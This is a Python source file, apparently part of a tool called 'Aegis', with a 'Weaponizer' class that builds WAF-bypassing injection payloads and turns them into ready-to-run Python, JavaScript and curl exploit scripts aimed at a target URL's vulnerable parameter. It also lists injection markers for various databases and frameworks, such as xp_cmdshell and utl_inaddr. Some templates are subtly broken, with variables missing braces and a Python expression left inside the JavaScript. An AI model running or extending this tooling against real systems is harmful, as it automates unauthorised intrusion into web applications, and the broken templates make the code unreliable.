        reasons.append(f"Base template selected for {context.primary_database or 'generic'} DB")
        reasons.append(f"Bypass technique: {technique.value}")
        
        if context.waf_type != 'none':
            reasons.append(f"Targeted for {context.waf_type} WAF (level={context.protection_level})")
        
        if context.primary_framework:
            reasons.append(f"Framework-aware: {context.primary_framework}")
        
        if context.input_parameter_type:
            reasons.append(f"Input type: {context.input_parameter_type}")
        
        return reasons
    
    def _extract_target_specific_features(self, payload: str, 
                                          context: TargetContext) -> List[str]:
        """提取Payload中的目标特定特征"""
        features = []
        
        if context.primary_database:
            db_indicators = {
                'mysql': ['union select', 'sleep(', 'benchmark(', '--', '#'],
                'postgresql': ['pg_sleep(', 'version()', 'current_database'],
                'mssql': ['@@version', 'xp_cmdshell', 'sysobjects'],
                'oracle': ['dual', 'utl_inaddr', 'ctxsys'],
            }
            
            for indicator in db_indicators.get(context.primary_database.lower(), []):
                if indicator in payload.lower():
                    features.append(f"DB-specific syntax: {indicator}")
        
        if context.primary_framework:
            fw_indicators = {
                'thinkphp': ['where]=', 'updatexml', 'extractvalue'],
                'django': ['csrfmiddlewaretoken', 'django'],
                'drupal': ['form_build_id', 'form_token'],
                'laravel': ['XSRF-TOKEN', 'laravel_session'],
            }
            
            for indicator in fw_indicators.get(context.primary_framework.lower(), []):
                if indicator.lower() in payload.lower():
                    features.append(f"Framework-specific: {indicator}")
        
        return features
    
    def _json_encode(self, payload: str) -> str:
        """对Payload进行JSON编码"""
        import json
        return json.dumps(payload)
    
    def _xml_escape(self, payload: str) -> str:
        """对Payload进行XML转义"""
        escapes = {
            '&': '&amp;',
            '<': '&lt;',
            '>': '&gt;',
            '"': '&quot;',
            "'": '&apos;',
        }
        for char, escaped in escapes.items():
            payload = payload.replace(char, escaped)
        return payload
    
    def _generate_python_exploit(self, vuln_type: str, url: str, 
                                  param: str, 
                                  payload: WeaponizedPayload) -> str:
        """生成Python Exploit"""
        return f'''#!/usr/bin/env python3
"""
Aegis Auto-generated Exploit
Vulnerability Type: {vuln_type.upper()}
Target: {url}
Generated: {time.strftime("%Y-%m-%d %H:%M:%S")}
"""

import requests
import sys
from urllib.parse import urlencode

TARGET_URL = "{url}"
VULNERABLE_PARAM = "{param}"

def exploit():
    """Execute the exploit"""
    print("[*] Aegis Exploit Generator")
    print(f"[*] Target: TARGET_URL")
    print(f"[*] Vulnerable Parameter: VULNERABLE_PARAM")
    print(f"[*] Vulnerability Type: {vuln_type.upper()}")
    print()
    
    # Prepare payload
    payload = {payload.encoded!r}
    
    # Construct malicious request
    params = {{VULNERABLE_PARAM: payload}}
    
    headers = {{
        "User-Agent": "Aegis-Security-Scanner/2.0",
        "Accept": "*/*",
    }}
    
    print(f"[+] Sending payload: {{payload[:50]}}...")
    
    try:
        response = requests.get(TARGET_URL, params=params, headers=headers, 
                               timeout=10, verify=False)
        
        print(f"[+] Response Status Code: response.status_code")
        print(f"[+] Response Length: len(response.content)")
        
        # Check for success indicators
        if response.status_code == 200:
            print("[!] Request completed successfully")
            print("[*] Check the response content for vulnerability confirmation")
            print("\\n--- Response Preview ---")
            print(response.text[:500])
        else:
            print(f"[!] Unexpected status code: response.status_code")
        
        return response
        
    except Exception as e:
        print(f"[-] Error: e")
        return None

if __name__ == "__main__":
    exploit()
'''
    
    def _generate_javascript_exploit(self, vuln_type: str, url: str,
                                      param: str,
                                      payload: WeaponizedPayload) -> str:
        """生成JavaScript Exploit"""
        return f'''/**
 * Aegis Auto-generated Exploit
 * Vulnerability Type: {vuln_type.upper()}
 * Target: {url}
 * Generated: {time.strftime("%Y-%m-%d %H:%M:%S")}
 */

const TARGET_URL = "{url}";
const VULNERABLE_PARAM = "{param}";

async function exploit() {{
    console.log("[*] Aegis Exploit Generator");
    console.log(`[*] Target: ${{TARGET_URL}}`);
    console.log(`[*] Vulnerable Parameter: ${{VULNERABLE_PARAM}}`);
    console.log(`[*] Vulnerability Type: {vuln_type.toUpperCase()}`);
    console.log();
    
    const payload = `{payload.encoded.replace(chr(96), '')}`;  // 移除反引号
    
    const params = new URLSearchParams();
    params.append(VULNERABLE_PARAM, payload);
    
    const urlWithParams = `${{TARGET_URL}}?${{params.toString()}}`;
    
    console.log(`[+] Sending payload: ${{payload.substring(0, 50)}}...`);
    
    try {{
        const response = await fetch(urlWithParams, {{
            method: 'GET',
            headers: {{
                'User-Agent': 'Aegis-Security-Scanner/2.0',
                'Accept': '*/*',
            }},
        }});
        
        console.log(`[+] Response Status: ${{response.status}}`);
        console.log(`[+] Response Length: ${{(await response.text()).length}}`);
        
        if (response.ok) {{
            console.log("[!] Request completed successfully");
            console.log("[*] Check response for vulnerability confirmation");
            console.log("\\n--- Response Preview ---");
            console.log((await response.text()).substring(0, 500));
        }}
        
        return response;
    }} catch (error) {{
        console.error(`[-] Error: ${{error.message}}`);
        return null;
    }}

exploit();
'''
    
    def _generate_curl_exploit(self, vuln_type: str, url: str,
                                param: str,
                                payload: WeaponizedPayload) -> str:
        """生成curl命令Exploit"""
        return f'''#!/bin/bash
# Aegis Auto-generated Exploit
# Vulnerability Type: {vuln_type.upper()}
# Target: {url}
# Generated: {time.strftime("%Y-%m-%d %H:%M:%S")}

TARGET="{url}"
PARAM="{param}"
PAYLOAD='{payload.encoded}'

echo "[*] Aegis Exploit Generator"
echo "[*] Target: $TARGET"
echo "[*] Vulnerable Parameter: $PARAM"
echo "[*] Vulnerability Type: {vuln_type.upper()}"
echo ""

echo "[+] Sending payload: $PAYLOAD..."

curl -k -v "$TARGET?$PARAM=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$PAYLOAD'))")" \\
    -H "User-Agent: Aegis-Security-Scanner/2.0" \\
    -H "Accept: */*" \\
    -o /tmp/aegis_response.html

echo ""
echo "[+] Response saved to /tmp/aegis_response.html"
echo "[*] Check the file for vulnerability confirmation"
'''
    
    def get_statistics(self) -> Dict[str, Any]:
        """获取统计信息"""
        return {
            "total_synthesized": self._synthesis_count,
            "total_exploits_generated": self._exploit_generation_count,
        }


def create_weaponizer(strategy: str = "intelligent") -> Weaponizer:
    """创建Weaponizer实例的便捷函数"""
    return Weaponizer(strategy=strategy)
